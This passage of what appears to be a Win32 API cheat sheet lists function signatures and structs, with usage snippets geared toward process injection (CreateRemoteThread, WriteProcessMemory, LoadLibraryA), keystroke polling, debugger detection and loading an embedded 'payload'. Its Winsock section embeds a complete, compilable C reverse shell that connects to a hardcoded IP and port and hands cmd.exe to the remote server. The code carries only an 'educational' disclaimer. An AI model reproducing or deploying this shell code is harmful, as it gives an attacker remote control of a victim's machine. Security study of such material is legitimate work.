LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] SIZE_T dwStackSize, [in] LPTHREAD_START_ROUTINE lpStartAddress, [in] LPVOID lpParameter, [in] DWORD dwCreationFlags, [out] LPDWORD lpThreadId ); // Creates a thread that runs in the virtual address space of another process. hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL); // pRemoteCode from VirtualAllocEx filled by WriteProcessMemory CreateRemoteThreadEx HANDLE CreateRemoteThreadEx( [in] HANDLE hProcess, [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] SIZE_T dwStackSize, [in] LPTHREAD_START_ROUTINE lpStartAddress, [in, optional] LPVOID lpParameter, [in] DWORD dwCreationFlags, [in, optional] LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, [out, optional] LPDWORD lpThreadId ); // Creates a thread that runs in the virtual address space of another process and optionally specifies extended attributes such as processor group affinity. // See InitializeProcThreadAttributeList hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, lpAttributeList, NULL); // pRemoteCode from VirtualAllocEx filled by WriteProcessMemory ExitThread VOID ExitThread( DWORD dwExitCode ); // Terminates the calling thread and returns the exit code to the operating system. GetExitCodeThread BOOL GetExitCodeThread( HANDLE hThread, LPDWORD lpExitCode ); // Retrieves the termination status of the specified thread. ResumeThread DWORD ResumeThread( HANDLE hThread ); // Decrements a thread's suspend count. When the suspend count is decremented to zero, the execution of the thread is resumed. SuspendThread DWORD SuspendThread( HANDLE hThread ); // Suspends the specified thread. TerminateThread BOOL TerminateThread( HANDLE hThread, DWORD dwExitCode ); // Terminates the specified thread. CloseHandle BOOL CloseHandle( HANDLE hObject ); // Closes an open handle. Dynamic-Link Library (DLL) Management LoadLibrary HMODULE LoadLibrary( LPCTSTR lpFileName ); // Loads a dynamic-link library (DLL) module into the address space of the calling process. LoadLibraryExA HMODULE LoadLibraryExA( [in] LPCSTR lpLibFileName, HANDLE hFile, [in] DWORD dwFlags ); // Loads the specified module into the address space of the calling process, with additional options. HMODULE hModule = LoadLibraryExA(\"ws2_32.dll\", NULL, LOAD_LIBRARY_SAFE_CURRENT_DIRS); GetProcAddress FARPROC GetProcAddress( HMODULE hModule, LPCSTR lpProcName ); // Retrieves the address of an exported function or variable from the specified DLL. pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle(\"Kernel32.dll\"), \"LoadLibraryA\"); FreeLibrary BOOL FreeLibrary( HMODULE hModule ); // Frees the loaded DLL module and, if necessary, decrements its reference count. Synchronization CreateMutex HANDLE CreateMutex( LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCTSTR lpName ); // Creates a named or unnamed mutex object. CreateSemaphore HANDLE CreateSemaphore( LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, LONG lInitialCount, LONG lMaximumCount, LPCTSTR lpName ); // Creates a named or unnamed semaphore object. ReleaseMutex BOOL ReleaseMutex( HANDLE hMutex ); // Releases ownership of the specified mutex object. ReleaseSemaphore BOOL ReleaseSemaphore( HANDLE hSemaphore, LONG lReleaseCount, LPLONG lpPreviousCount ); // Increases the count of the specified semaphore object by a specified amount. WaitForSingleObject DWORD WaitForSingleObject( [in] HANDLE hHandle, [in] DWORD dwMilliseconds ); // Waits until the specified object is in the signaled state or the time-out interval elapses. WaitForSingleObject(hThread, 500); Interprocess Communication CreatePipe BOOL CreatePipe( PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize ); // Creates an anonymous pipe and returns handles to the read and write ends of the pipe. CreateNamedPipe HANDLE CreateNamedPipe( LPCTSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes ); // Creates a named pipe and returns a handle for subsequent pipe operations. ConnectNamedPipe BOOL ConnectNamedPipe( HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped ); // Enables a named pipe server process to wait for a client process to connect to an instance of a named pipe. DisconnectNamedPipe BOOL DisconnectNamedPipe( HANDLE hNamedPipe ); // Disconnects the server end of a named pipe instance from a client process. CreateFileMapping HANDLE CreateFileMapping( HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCTSTR lpName ); // Creates or opens a named or unnamed file mapping object for a specified file. MapViewOfFile LPVOID MapViewOfFile( HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap ); // Maps a view of a file mapping into the address space of the calling process. UnmapViewOfFile BOOL UnmapViewOfFile( LPCVOID lpBaseAddress ); // Unmaps a mapped view of a file from the calling process's address space. CloseHandle BOOL CloseHandle( HANDLE hObject ); // Closes an open handle. Windows Hooks SetWindowsHookExA HHOOK SetWindowsHookExA( [in] int idHook, [in] HOOKPROC lpfn, [in] HINSTANCE hmod, [in] DWORD dwThreadId ); // Installs an application-defined hook procedure into a hook chain. You would install a hook procedure to monitor the system for certain types of events. These events are associated either with a specific thread or with all threads in the same desktop as the calling thread. CallNextHookEx LRESULT CallNextHookEx( [in, optional] HHOOK hhk, [in] int nCode, [in] WPARAM wParam, [in] LPARAM lParam ); // Passes the hook information to the next hook procedure in the current hook chain. A hook procedure can call this function either before or after processing the hook information. UnhookWindowsHookEx BOOL UnhookWindowsHookEx( [in] HHOOK hhk ); // Removes a hook procedure installed in a hook chain by the SetWindowsHookEx function. GetAsyncKeyState SHORT GetAsyncKeyState( [in] int vKey ); // Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState. GetKeyState SHORT GetKeyState( [in] int nVirtKey ); // Retrieves the status of the specified virtual key. The status specifies whether the key is up, down, or toggled (on, off\u2014alternating each time the key is pressed). GetKeyboardState BOOL GetKeyboardState( [out] PBYTE lpKeyState ); // Copies the status of the 256 virtual keys to the specified buffer. Cryptography CryptBinaryToStringA BOOL CryptBinaryToStringA( [in] const BYTE *pbBinary, [in] DWORD cbBinary, [in] DWORD dwFlags, [out, optional] LPSTR pszString, [in, out] DWORD *pcchString ); // The CryptBinaryToString function converts an array of bytes into a formatted string. CryptDecrypt BOOL CryptDecrypt( [in] HCRYPTKEY hKey, [in] HCRYPTHASH hHash, [in] BOOL Final, [in] DWORD dwFlags, [in, out] BYTE *pbData, [in, out] DWORD *pdwDataLen ); // The CryptDecrypt function decrypts data previously encrypted by using the CryptEncrypt function. CryptEncrypt BOOL CryptEncrypt( [in] HCRYPTKEY hKey, [in] HCRYPTHASH hHash, [in] BOOL Final, [in] DWORD dwFlags, [in, out] BYTE *pbData, [in, out] DWORD *pdwDataLen, [in] DWORD dwBufLen ); // The CryptEncrypt function encrypts data. The algorithm used to encrypt the data is designated by the key held by the CSP module and is referenced by the hKey parameter. CryptDecryptMessage BOOL CryptDecryptMessage( [in] PCRYPT_DECRYPT_MESSAGE_PARA pDecryptPara, [in] const BYTE *pbEncryptedBlob, [in] DWORD cbEncryptedBlob, [out, optional] BYTE *pbDecrypted, [in, out, optional] DWORD *pcbDecrypted, [out, optional] PCCERT_CONTEXT *ppXchgCert ); // The CryptDecryptMessage function decodes and decrypts a message. CryptEncryptMessage BOOL CryptEncryptMessage( [in] PCRYPT_ENCRYPT_MESSAGE_PARA pEncryptPara, [in] DWORD cRecipientCert, [in] PCCERT_CONTEXT [] rgpRecipientCert, [in] const BYTE *pbToBeEncrypted, [in] DWORD cbToBeEncrypted, [out] BYTE *pbEncryptedBlob, [in, out] DWORD *pcbEncryptedBlob ); // The CryptEncryptMessage function encrypts and encodes a message. Debugging IsDebuggerPresent BOOL IsDebuggerPresent(); // Determines whether the calling process is being debugged by a user-mode debugger. CheckRemoteDebuggerPresent BOOL CheckRemoteDebuggerPresent( [in] HANDLE hProcess, [in, out] PBOOL pbDebuggerPresent ); // Determines whether the specified process is being debugged. OutputDebugStringA void OutputDebugStringA( [in, optional] LPCSTR lpOutputString ); // Sends a string to the debugger for display. Winsock /*** Windows Reverse Shell * * \u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2584 \u2588 \u2592\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2591 \u2584\u2588\u2588\u2588\u2588\u2584 \u2588\u2588\u2580\u2588\u2588\u2588 \u2584\u2584\u2584 \u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2591 \u2588\u2588 * \u2592\u2588\u2588 \u2592 \u2588\u2588 \u2580\u2588 \u2588 \u2592\u2588\u2588\u2592 \u2588\u2588\u2592\u2593\u2588\u2591 \u2588 \u2591\u2588\u2591\u2592\u2588\u2588\u2580 \u2580\u2588 \u2593\u2588\u2588 \u2592 \u2588\u2588\u2592\u2592\u2588\u2588\u2588\u2588\u2584 \u2592\u2588\u2588 \u2592 \u2593\u2588\u2588\u2591 \u2588\u2588\u2592 * \u2591 \u2593\u2588\u2588\u2584 \u2593\u2588\u2588 \u2580\u2588 \u2588\u2588\u2592\u2592\u2588\u2588\u2591 \u2588\u2588\u2592\u2592\u2588\u2591 \u2588 \u2591\u2588 \u2592\u2593\u2588 \u2584 \u2593\u2588\u2588 \u2591\u2584\u2588 \u2592\u2592\u2588\u2588 \u2580\u2588\u2584 \u2591 \u2593\u2588\u2588\u2584 \u2592\u2588\u2588\u2580\u2580\u2588\u2588\u2591 * \u2592 \u2588\u2588\u2592\u2593\u2588\u2588\u2592 \u2590\u258c\u2588\u2588\u2592\u2592\u2588\u2588 \u2588\u2588\u2591\u2591\u2588\u2591 \u2588 \u2591\u2588 \u2592\u2593\u2593\u2584 \u2584\u2588\u2588\u2592\u2592\u2588\u2588\u2580\u2580\u2588\u2584 \u2591\u2588\u2588\u2584\u2584\u2584\u2584\u2588\u2588 \u2592 \u2588\u2588\u2592\u2591\u2593\u2588 \u2591\u2588\u2588 * \u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2588\u2588\u2591 \u2593\u2588\u2588\u2591\u2591 \u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2591\u2588\u2588\u2592\u2588\u2588\u2593 \u2592 \u2593\u2588\u2588\u2588\u2580 \u2591\u2591\u2588\u2588\u2593 \u2592\u2588\u2588\u2592 \u2593\u2588 \u2593\u2588\u2588\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2591\u2593\u2588\u2592\u2591\u2588\u2588\u2593 * \u2592 \u2592\u2593\u2592 \u2592 \u2591\u2591 \u2592\u2591 \u2592 \u2592 \u2591 \u2592\u2591\u2592\u2591\u2592\u2591 \u2591 \u2593\u2591\u2592 \u2592 \u2591 \u2591\u2592 \u2592 \u2591\u2591 \u2592\u2593 \u2591\u2592\u2593\u2591 \u2592\u2592 \u2593\u2592\u2588\u2591\u2592 \u2592\u2593\u2592 \u2592 \u2591 \u2592 \u2591\u2591\u2592\u2591\u2592 * \u2591 \u2591\u2592 \u2591 \u2591\u2591 \u2591\u2591 \u2591 \u2592\u2591 \u2591 \u2592 \u2592\u2591 \u2592 \u2591 \u2591 \u2591 \u2592 \u2591\u2592 \u2591 \u2592\u2591 \u2592 \u2592\u2592 \u2591\u2591 \u2591\u2592 \u2591 \u2591 \u2592 \u2591\u2592\u2591 \u2591 * \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2592 \u2591 \u2591 \u2591 \u2591\u2591 \u2591 \u2591 \u2592 \u2591 \u2591 \u2591 \u2591 \u2591\u2591 \u2591 * \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 * Written by: snowcra5h@icloud.com (snowcra5h) 2023 * * This program establishes a reverse shell via the Winsock2 library. It is * designed to establish a connection to a specified remote server, and execute commands * received from the server on the local machine, giving the server * control over the local machine. * * Compile command (using MinGW on Wine): * wine gcc.exe windows.c -o windows.exe -lws2_32 * * This code is intended for educational and legitimate penetration testing purposes only. * Please use responsibly and ethically. * */ #include <winsock2.h> #include <ws2tcpip.h> #include <stdio.h> #include <windows.h> #include <process.h> const char* const PORT = \"1337\"; const char* const IP = \"10.37.129.2\"; typedef struct { HANDLE hPipeRead; HANDLE hPipeWrite; SOCKET sock; } ThreadParams; DWORD WINAPI OutputThreadFunc(LPVOID data); DWORD WINAPI InputThreadFunc(LPVOID data); void CleanUp(HANDLE hInputWrite, HANDLE hInputRead, HANDLE hOutputWrite, HANDLE hOutputRead, PROCESS_INFORMATION processInfo, addrinfo* result, SOCKET sock); int main(int argc, char** argv) { WSADATA wsaData; int err = WSAStartup(MAKEWORD(2, 2), &wsaData); if (err != 0) { fprintf(stderr, \"WSAStartup failed: %d\\n\", err); return 1; } SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED); if (sock == INVALID_SOCKET) { fprintf(stderr, \"Socket function failed with error = %d\\n\", WSAGetLastError()); WSACleanup(); return 1; } struct addrinfo hints = { 0 }; hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM; struct addrinfo* result; err = getaddrinfo(IP, PORT, &hints, &result); if (err != 0) { fprintf(stderr, \"Failed to get address info: %d\\n\", err); CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock); return 1; } if (WSAConnect(sock, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL) == SOCKET_ERROR) { fprintf(stderr, \"Failed to connect.\\n\"); CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock); return 1; } SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE }; HANDLE hInputWrite, hOutputRead, hInputRead, hOutputWrite; if (!CreatePipe(&hOutputRead, &hOutputWrite, &sa, 0) || !CreatePipe(&hInputRead, &hInputWrite, &sa, 0)) { fprintf(stderr, \"Failed to create pipe.\\n\"); CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock); return 1; } STARTUPINFO startupInfo = { 0 }; startupInfo.cb = sizeof(startupInfo); startupInfo.dwFlags = STARTF_USESTDHANDLES; startupInfo.hStdInput = hInputRead; startupInfo.hStdOutput = hOutputWrite; startupInfo.hStdError = hOutputWrite; PROCESS_INFORMATION processInfo; WCHAR cmd[] = L\"cmd.exe /k\"; if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo)) { fprintf(stderr, \"Failed to create process.\\n\"); CleanUp(hInputWrite, hInputRead, hOutputWrite, hOutputRead, processInfo, result, sock); return 1; } CloseHandle(hInputRead); CloseHandle(hOutputWrite); CloseHandle(processInfo.hThread); ThreadParams outputParams = { hOutputRead, NULL, sock }; ThreadParams inputParams = { NULL, hInputWrite, sock }; HANDLE hThread[2]; hThread[0] = CreateThread(NULL, 0, OutputThreadFunc, &outputParams, 0, NULL); hThread[1] = CreateThread(NULL, 0, InputThreadFunc, &inputParams, 0, NULL); WaitForMultipleObjects(2, hThread, TRUE, INFINITE); CleanUp(hInputWrite, NULL, NULL, hOutputRead, processInfo, result, sock); return 0; } void CleanUp(HANDLE hInputWrite, HANDLE hInputRead, HANDLE hOutputWrite, HANDLE hOutputRead, PROCESS_INFORMATION processInfo, addrinfo* result, SOCKET sock) { if (hInputWrite != NULL) CloseHandle(hInputWrite); if (hInputRead != NULL) CloseHandle(hInputRead); if (hOutputWrite != NULL) CloseHandle(hOutputWrite); if (hOutputRead != NULL) CloseHandle(hOutputRead); if (processInfo.hProcess != NULL) CloseHandle(processInfo.hProcess); if (processInfo.hThread != NULL) CloseHandle(processInfo.hThread); if (result != NULL) freeaddrinfo(result); if (sock != NULL) closesocket(sock); WSACleanup(); } DWORD WINAPI OutputThreadFunc(LPVOID data) { ThreadParams* params = (ThreadParams*)data; char buffer[4096]; DWORD bytesRead; while (ReadFile(params->hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) { buffer[bytesRead] = '\\0'; send(params->sock, buffer, bytesRead, 0); } return 0; } DWORD WINAPI InputThreadFunc(LPVOID data) { ThreadParams* params = (ThreadParams*)data; char buffer[4096]; int bytesRead; while ((bytesRead = recv(params->sock, buffer, sizeof(buffer) - 1, 0)) > 0) { DWORD bytesWritten; WriteFile(params->hPipeWrite, buffer, bytesRead, &bytesWritten, NULL); } return 0; } WSAStartup int WSAStartup( WORD wVersionRequired, LPWSADATA lpWSAData ); // Initializes the Winsock library for an application. Must be called before any other Winsock functions. WSAConnect int WSAConnect( SOCKET s, // Descriptor identifying a socket. const struct sockaddr* name, // Pointer to the sockaddr structure for the connection target. int namelen, // Length of the sockaddr structure. LPWSABUF lpCallerData, // Pointer to user data to be transferred during connection. LPWSABUF lpCalleeData, // Pointer to user data transferred back during connection. LPQOS lpSQOS, // Pointer to flow specs for socket s, one for each direction. LPQOS lpGQOS // Pointer to flow specs for the socket group. ); // Establishes a connection to another socket application.This function is similar to connect, but allows for more control over the connection process. WSASend int WSASend( SOCKET s, // Descriptor identifying a connected socket. LPWSABUF lpBuffers, // Array of buffers for data to be sent. DWORD dwBufferCount, // Number of buffers in the lpBuffers array. LPDWORD lpNumberOfBytesSent, // Pointer to the number of bytes sent by this function call. DWORD dwFlags, // Flags to modify the behavior of the function call. LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations. LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the send operation has been completed. ); // Sends data on a connected socket.It can be used for both synchronous and asynchronous data transfer. WSARecv int WSARecv( SOCKET s, // Descriptor identifying a connected socket. LPWSABUF lpBuffers, // Array of buffers to receive the incoming data. DWORD dwBufferCount, // Number of buffers in the lpBuffers array. LPDWORD lpNumberOfBytesRecvd, // Pointer to the number of bytes received by this function call. LPDWORD lpFlags, // Flags to modify the behavior of the function call. LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations. LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the receive operation has been completed. ); //Receives data from a connected socket, and can also be used for both synchronous and asynchronous data transfer. WSASendTo int WSASendTo( SOCKET s, // Descriptor identifying a socket. LPWSABUF lpBuffers, // Array of buffers containing the data to be sent. DWORD dwBufferCount, // Number of buffers in the lpBuffers array. LPDWORD lpNumberOfBytesSent, // Pointer to the number of bytes sent by this function call. DWORD dwFlags, // Flags to modify the behavior of the function call. const struct sockaddr* lpTo, // Pointer to the sockaddr structure for the target address. int iToLen, // Size of the address in lpTo. LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations. LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the send operation has been completed. ); // Sends data to a specific destination, for use with connection - less socket types such as SOCK_DGRAM. WSARecvFrom int WSARecvFrom( SOCKET s, // Descriptor identifying a socket. LPWSABUF lpBuffers, // Array of buffers to receive the incoming data. DWORD dwBufferCount, // Number of buffers in the lpBuffers array. LPDWORD lpNumberOfBytesRecvd, // Pointer to the number of bytes received by this function call. LPDWORD lpFlags, // Flags to modify the behavior of the function call. struct sockaddr* lpFrom, // Pointer to an address structure that will receive the source address upon completion of the operation. LPINT lpFromlen, // Pointer to the size of the lpFrom address structure. LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations. LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the receive operation has been completed. ); //Receives data from a specific source, used with connection - less socket types such as SOCK_DGRAM. WSAAsyncSelect int WSAAsyncSelect( SOCKET s, // Descriptor identifying the socket. HWND hWnd, // Handle to the window which should receive the message. unsigned int wMsg, // Message to be received when an event occurs. long lEvent // Bitmask specifying a group of conditions to be monitored. ); // Requests Windows message - based notification of network events for a socket. socket SOCKET socket( int af, int type, int protocol ); // Creates a new socket for network communication. bind int bind( SOCKET s, const struct sockaddr *name, int namelen ); // Binds a socket to a specific local address and port. listen int listen( SOCKET s, int backlog ); // Sets a socket to listen for incoming connections. accept SOCKET accept( SOCKET s, struct sockaddr *addr, int *addrlen ); // Accepts a new incoming connection on a listening socket. connect int connect( SOCKET s, const struct sockaddr *name, int namelen ); // Initiates a connection on a socket to a remote address. send int send( SOCKET s, const char *buf, int len, int flags ); // Sends data on a connected socket. recv int recv( SOCKET s, char *buf, int len, int flags ); // Receives data from a connected socket. closesocket int closesocket( SOCKET s ); //Closes a socket and frees its resources. gethostbyname hostent* gethostbyname( const char* name // either a hostname or an IPv4 address in dotted-decimal notation ); // returns a pointer to a hostent struct. NOTE: Typically better to use getaddrinfo Registry Operations RegOpenKeyExW LONG RegOpenKeyExW( HKEY hKey, LPCWTSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult ); // Opens the specified registry key. RegQueryValueExW LONG RegQueryValueExW( HKEY hKey, LPCWTSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData ); // Retrieves the type and data of the specified value name associated with an open registry key. RegSetValueExW LONG RegSetValueEx( HKEY hKey, LPCWTSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData ); // Sets the data and type of the specified value name associated with an open registry key. RegCloseKey LONG RegCloseKey( HKEY hKey ); // Closes a handle to the specified registry key. RegCreateKeyExA LSTATUS RegCreateKeyExA( [in] HKEY hKey, [in] LPCSTR lpSubKey, DWORD Reserved, [in, optional] LPSTR lpClass, [in] DWORD dwOptions, [in] REGSAM samDesired, [in, optional] const LPSECURITY_ATTRIBUTES lpSecurityAttributes, [out] PHKEY phkResult, [out, optional] LPDWORD lpdwDisposition ); // Creates the specified registry key. If the key already exists, the function opens it. Note that key names are not case sensitive. RegSetValueExA LSTATUS RegSetValueExA( [in] HKEY hKey, [in, optional] LPCSTR lpValueName, DWORD Reserved, [in] DWORD dwType, [in] const BYTE *lpData, [in] DWORD cbData ); // Sets the data and type of a specified value under a registry key. RegCreateKeyA LSTATUS RegCreateKeyA( [in] HKEY hKey, [in, optional] LPCSTR lpSubKey, [out] PHKEY phkResult ); // Creates the specified registry key. If the key already exists in the registry, the function opens it. RegDeleteKeyA LSTATUS RegDeleteKeyA( [in] HKEY hKey, [in] LPCSTR lpSubKey ); // Deletes a subkey and its values. Note that key names are not case sensitive. NtRenameKey __kernel_entry NTSTATUS NtRenameKey( [in] HANDLE KeyHandle, [in] PUNICODE_STRING NewName ); // Changes the name of the specified registry key. Error Handling WSAGetLastError int WSAGetLastError( void ); // Returns the error status for the last Windows Sockets operation that failed. WSASetLastError void WSASetLastError( int iError ); // Sets the error status for the last Windows Sockets operation. WSAGetOverlappedResult BOOL WSAGetOverlappedResult( SOCKET s, LPWSAOVERLAPPED lpOverlapped, LPDWORD lpcbTransfer, BOOL fWait, LPDWORD lpdwFlags ); // Determines the results of an overlapped operation on the specified socket. WSAIoctl int WSAIoctl( SOCKET s, DWORD dwIoControlCode, LPVOID lpvInBuffer, DWORD cbInBuffer, LPVOID lpvOutBuffer, DWORD cbOutBuffer, LPDWORD lpcbBytesReturned, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine ); // Controls the mode of a socket. WSACreateEvent WSAEVENT WSACreateEvent( void ); // Creates a new event object. WSASetEvent BOOL WSASetEvent( WSAEVENT hEvent ); // Sets the state of the specified event object to signaled. WSAResetEvent BOOL WSAResetEvent( WSAEVENT hEvent ); // Sets the state of the specified event object to nonsignaled. WSACloseEvent BOOL WSACloseEvent( WSAEVENT hEvent ); // Closes an open event object handle. WSAWaitForMultipleEvents DWORD WSAWaitForMultipleEvents( DWORD cEvents, const WSAEVENT *lphEvents, BOOL fWaitAll, DWORD dwTimeout, BOOL fAlertable ); // Waits for multiple event objects and returns when the specified events are signaled or the time-out interval elapses. Resource Management FindResource HRSRC FindResource( [in, optional] HMODULE hModule, // A handle to the module whose portable executable file or an accompanying MUI file contains the resource. If this parameter is NULL, the function searches the module used to create the current process. [in] LPCSTR lpName, // The name of the resource. [in] LPCSTR lpType // The resource type. ); // Determines the location of a resource with the specified type and name in the specified module. HRSRC res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA); LoadResource HGLOBAL LoadResource( [in, optional] HMODULE hModule, // A handle to the module whose executable file contains the resource. [in] HRSRC hResInfo // A handle to the resource to be loaded. ); // Retrieves a handle that can be used to obtain a pointer to the first byte of the specified resource in memory. HGLOBAL resHandle = resHandle = LoadResource(NULL, res); LockResource LPVOID LockResource( [in] HGLOBAL hResData // A handle to the resource to be accessed ); // Retrieves a pointer to the specified resource in memory. unsigned char * payload = (char *) LockResource(resHandle); SizeofResource DWORD SizeofResource( [in, optional] HMODULE hModule, // A handle to the module whose executable file contains the resource [in] HRSRC hResInfo // A handle to the resource. This handle must be created by using FindResource ); // Retrieves the size, in bytes, of the specified resource. unsigned int payload_len = SizeofResource(NULL, res); Unicode String Functions #include <wchar.h> // for wide character string routines String Length size_t wcslen( const wchar_t *str ); // Returns the length of the given wide string. String Copy [wcscpy] wchar_t *wcscpy( wchar_t *dest, const wchar_t *src ); // Copies the wide string from src to dest. [wcsncpy] wchar_t *wcsncpy( wchar_t *dest, const wchar_t *src, size_t count ); // Copies at most count characters from the wide string src to dest. String Concatenation [wcscat] wchar_t *wcscat( wchar_t *dest, const wchar_t *src ); // Appends the wide string src to the end of the wide string dest. [wcsncat] wchar_t *wcsncat( wchar_t *dest, const wchar_t *src, size_t count ); // Appends at most count characters from the wide string src to the end of the wide string dest. String Comparison [wcscmp] int wcscmp( const wchar_t *str1, const wchar_t *str2 ); // Compares two wide strings lexicographically. [wcsncmp] int wcsncmp( const wchar_t *str1, const wchar_t *str2, size_t count ); // Compares up to count characters of two wide strings lexicographically. [_wcsicmp] int _wcsicmp( const wchar_t *str1, const wchar_t *str2 ); // Compares two wide strings lexicographically, ignoring case. [_wcsnicmp] int _wcsnicmp( const wchar_t *str1, const wchar_t *str2, size_t count ); // Compares up to count characters of two wide strings lexicographically, ignoring case. String Search [wcschr] wchar_t *wcschr( const wchar_t *str, wchar_t c ); // Finds the first occurrence of the wide character c in the wide string str. [wcsrchr] wchar_t *wcsrchr( const wchar_t *str, wchar_t c ); // Finds the last occurrence of the wide character c in the wide string str. [wcspbrk] wchar_t *wcspbrk( const wchar_t *str1, const wchar_t *str2 ); // Finds the first occurrence in the wide string str1 of any character from the wide string str2. [wcsstr] wchar_t *wcsstr( const wchar_t *str1, const wchar_t *str2 ); // Finds the first occurrence of the wide string str2 in the wide string str1. [wcstok] wchar_t *wcstok( wchar_t *str, const wchar_t *delimiters ); // Splits the wide string str into tokens based on the delimiters. Character Classification and Conversion [towupper] wint_t towupper( wint_t c ); // Converts a wide character to uppercase. [towlower] wint_t towlower( wint_t c ); // Converts a wide character to lowercase. [iswalpha] int iswalpha( wint_t c ); // Checks if the wide character is an alphabetic character. [iswdigit] int iswdigit( wint_t c ); // Checks if the wide character is a decimal digit. [iswalnum] int iswalnum( wint_t c ); // Checks if the wide character is an alphanumeric character. [iswspace] int iswspace( wint_t c ); // Checks if the wide character is a whitespace character. [iswxdigit] int iswxdigit( wint_t c ); // Checks if the wide character is a valid hexadecimal digit. Win32 Structs Cheat Sheet Common Structs SYSTEM_INFO #include <sysinfoapi.h> // Contains information about the current computer system, including the architecture and type of the processor, the number of processors, and the page size. typedef struct _SYSTEM_INFO { union { DWORD dwOemId; struct { WORD wProcessorArchitecture; WORD wReserved; } DUMMYSTRUCTNAME; } DUMMYUNIONNAME; DWORD dwPageSize; LPVOID lpMinimumApplicationAddress; LPVOID lpMaximumApplicationAddress; DWORD_PTR dwActiveProcessorMask; DWORD dwNumberOfProcessors; DWORD dwProcessorType; DWORD dwAllocationGranularity; WORD wProcessorLevel; WORD wProcessorRevision; } SYSTEM_INFO; FILETIME #include <minwinbase.h> // Represents the number of 100-nanosecond intervals since January 1, 1601 (UTC). Used for file and system time. typedef struct _FILETIME { DWORD dwLowDateTime; DWORD dwHighDateTime; } FILETIME; STARTUPINFO #include <processthreadsapi.h> // Specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time. typedef struct _STARTUPINFOA { DWORD cb; LPSTR lpReserved; LPSTR lpDesktop; LPSTR lpTitle; DWORD dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize; DWORD dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute; DWORD dwFlags; WORD wShowWindow; WORD cbReserved2; LPBYTE lpReserved2; HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError; } STARTUPINFOA, *LPSTARTUPINFOA; PROCESS_INFORMATION #include <processthreadsapi.h> // Contains information about a newly created process and its primary thread. typedef struct _PROCESS_INFORMATION { HANDLE hProcess; HANDLE hThread; DWORD dwProcessId; DWORD dwThreadId; } PROCESS_INFORMATION, *LPPROCESS_INFORMATION; PROCESSENTRY32 #include <tlhelp32.h> typedef struct tagPROCESSENTRY32 { DWORD dwSize; DWORD cntUsage; DWORD th32ProcessID; ULONG_PTR th32DefaultHeapID; DWORD th32ModuleID; DWORD cntThreads; DWORD th32ParentProcessID; LONG pcPriClassBase; DWORD dwFlags; CHAR szExeFile[MAX_PATH]; } PROCESSENTRY32; SECURITY_ATTRIBUTES // Determines whether the handle can be inherited by child processes and specifies a security descriptor for a new object. typedef struct _SECURITY_ATTRIBUTES { DWORD nLength; LPVOID lpSecurityDescriptor; BOOL bInheritHandle; } SECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES; OVERLAPPED 